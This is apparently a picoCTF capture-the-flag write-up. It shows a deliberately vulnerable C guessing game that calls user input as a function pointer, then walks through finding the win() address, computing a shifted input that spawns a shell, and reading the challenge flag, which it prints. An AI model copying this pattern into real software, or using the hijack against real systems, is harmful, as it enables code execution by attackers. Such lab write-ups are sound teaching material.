Guess the number - Level 2
=========================================

## Original Code

```c
/* How well do you know your numbers? */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

void win(void) {
    printf("Congratulations! Have a shell:\n");
    system("/bin/sh -i");
}

int main(int argc, char **argv) {
    uintptr_t val;
    char buf[32] = "";

    /* Turn off buffering so we can see output right away */
    setbuf(stdout, NULL);

    printf("Welcome to the number guessing game!\n");
    printf("I'm thinking of a number. Can you guess it?\n");
    printf("Guess right and you get a shell!\n");

    printf("Enter your number: ");
    scanf("%32s", buf);
    val = strtol(buf, NULL, 10);

    printf("You entered %lu. Let's see if it was right...\n", val);

    val >>= 4;
    ((void (*)(void))val)();
}
```
## Solution

I followed the hint, read what the code supposed to do with my input. What it does is:

1. Create a buffer with 32 slots.
2. Take input from user and put it in buffer, convert input from string type to decimal.
3. Shift input 4 to the right.

I consulted my friend rh0gue for the last line, since i'm a newbie and not familiar with C. Turn out the last line of this code converts a decimal number into a function pointer. I googled it real quick and got the answer: "A function pointer is a variable that stores the address of a function that can later be called through that function pointer. This is useful because functions encapsulate behavior." - cprogramming.com. So what is the function that I am looking for? My friend rh0gue again suggests me to find the address of win function.

> objdump -d guess.num

I was also given the binary code, so I disassembled it as my friend's suggestion. The address of win is 0x804852B. But that is not enough, I still need to pay attention to that shift >> 4.

> val >>= 4;

I wrote a simple C program to shift the number to the left, and print it as decimal. Look like we have a negative number.

```c
# include <stdio.h>
int main()
{
	long num = 0x804852b;
	long num2;
	num2 = num << 4;
	printf ("%d\n", num2);

```

> -2142743888

Note that strol does check for overflow, but it doesn't mind if the number is negative. That's it, I connected to shell2017.picoctf.com 13532.

```
You entered -2142743888. Let's see if it was right...
Congratulations! Have a shell:
/bin/sh: 0: can't access tty; job control turned off
```

Wait, it doesn't end here. So I lurked around, I found flag.txt. let's open it.

> cat flag.txt

We got the flag: eb485c1755fc97d4a3f0c3cc136f62e8.
 

